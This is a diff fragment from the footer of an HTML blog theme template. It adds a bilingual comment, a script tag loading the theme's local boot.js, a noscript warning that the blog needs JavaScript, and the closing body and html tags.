+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
